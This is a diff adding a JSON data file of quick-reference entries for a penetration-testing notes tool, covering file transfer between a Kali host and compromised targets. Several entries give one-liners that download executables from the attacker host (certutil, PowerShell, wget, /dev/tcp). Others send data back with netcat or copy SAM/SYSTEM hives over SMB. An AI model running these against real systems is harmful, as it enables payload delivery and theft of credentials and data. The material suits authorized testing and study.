@@ -1,0 +1,70 @@
+[
+  {
+    "slug": "transfer-to-windows",
+    "triggers": ["transfer to windows", "download file windows", "certutil download", "powershell download", "iwr", "get file to windows"],
+    "title": "Kali → Windows file transfer",
+    "answer_type": "inline",
+    "inline_answer": "Kali: `python3 -m http.server 80` (or `servr.sh`). On target:\n\n```\ncertutil -urlcache -split -f http://KALI/x.exe x.exe\npowershell -c \"iwr http://KALI/x.exe -OutFile x.exe\"\npowershell -c \"(New-Object Net.WebClient).DownloadFile('http://KALI/x.exe','x.exe')\"\n```\n\nNo HTTP egress? SMB: `copy \\\\KALI\\share\\x.exe .` (impacket-smbserver). Last resort: `exe2hex` / base64 paste.",
+    "inline_followup": "_CHEATSHEETS/File_Transfers.md#2-windows-target-downloading-files",
+    "tags": "file-transfer windows",
+    "priority": 205
+  },
+  {
+    "slug": "transfer-to-linux",
+    "triggers": ["transfer to linux", "wget from kali", "python http server", "download file linux", "get file to target", "curl from kali"],
+    "title": "Kali → Linux file transfer",
+    "answer_type": "inline",
+    "inline_answer": "Kali: `python3 -m http.server 80`. On target:\n\n```\nwget http://KALI/x -O /tmp/x   ||   curl http://KALI/x -o /tmp/x\n# neither installed:\nexec 3<>/dev/tcp/KALI/80; echo -e 'GET /x HTTP/1.0\\r\\n\\r\\n' >&3; cat <&3 > /tmp/x\n```\n\n`chmod +x /tmp/x`. Through a pivot? forward Kali:80 over the tunnel first.",
+    "inline_followup": "_CHEATSHEETS/File_Transfers.md#1-http-server-kali-any-target-manual-fallback",
+    "tags": "file-transfer linux",
+    "priority": 200
+  },
+  {
+    "slug": "exfil-to-kali",
+    "triggers": ["exfil", "exfiltrate", "get file from target", "send file to kali", "download from target", "copy back to kali"],
+    "title": "Target → Kali (exfiltration)",
+    "answer_type": "inline",
+    "inline_answer": "```\n# Kali listener:\nnc -lvnp 4444 > loot.tgz\n# target:\ntar czf - /path | nc KALI 4444\n# or HTTP upload to a Kali server that accepts PUT, or impacket-smbserver + copy,\n# or base64 the file and paste it back, then base64 -d on Kali.\n```\n\nFor SAM/SYSTEM hives use SMB (`copy sam.hive \\\\KALI\\share\\`).",
+    "inline_followup": "_CHEATSHEETS/File_Transfers.md#9-target-kali-exfiltration",
+    "tags": "file-transfer exfil",
+    "priority": 195
+  },
+  {
+    "slug": "smb-transfer",
+    "triggers": ["smbserver", "impacket smbserver", "smb file transfer", "copy via smb", "smb share kali", "net use kali"],
+    "title": "SMB file transfer (impacket-smbserver)",
+    "answer_type": "inline",
+    "inline_answer": "```\n# Kali (auth share — modern Windows refuses guest):\nimpacket-smbserver share ./www -smb2support -user a -password a\n# Windows target:\nnet use \\\\KALI\\share /user:a a\ncopy \\\\KALI\\share\\x.exe .          # or copy loot back the same way\n```\n\nBest for Windows when HTTP is filtered and for binary integrity (hives, zips).",
+    "inline_followup": "_CHEATSHEETS/File_Transfers.md#3-smb-share-best-for-windows-manual-fallback",
+    "tags": "file-transfer smb windows",
+    "priority": 195
+  },
+  {
+    "slug": "base64-transfer",
+    "triggers": ["base64 transfer", "no tools transfer", "base64 file", "paste file base64", "transfer no wget"],
+    "title": "Base64 transfer (no tools needed)",
+    "answer_type": "inline",
+    "inline_answer": "```\n# source:\nbase64 -w0 file            # (Windows: certutil -encode file b64.txt)\n# copy the blob, on the other side:\necho '<blob>' | base64 -d > file\n```\n\nFor big files split the blob. Survives when there is no wget/curl/scp/smb — only a shell.",
+    "inline_followup": "_CHEATSHEETS/File_Transfers.md#7-base64-encode-decode-no-tools-needed",
+    "tags": "file-transfer base64 fallback",
+    "priority": 185
+  },
+  {
+    "slug": "transfer-decision",
+    "triggers": ["how to transfer", "file transfer decision", "which transfer method", "transfer file", "move file to target"],
+    "title": "File transfer decision tree",
+    "answer_type": "chunk_ref",
+    "target_chunk_id": "_CHEATSHEETS/File_Transfers.md#transfer-decision-tree",
+    "tags": "file-transfer methodology decision",
+    "priority": 185
+  },
+  {
+    "slug": "transfer-through-pivot",
+    "triggers": ["transfer through pivot", "file transfer pivot", "copy file over tunnel", "transfer over ligolo", "file over pivot"],
+    "title": "File transfer through a pivot",
+    "answer_type": "chunk_ref",
+    "target_chunk_id": "_CHEATSHEETS/File_Transfers.md#11-file-transfer-through-a-pivot",
+    "tags": "file-transfer pivoting",
+    "priority": 180
+  }
+]
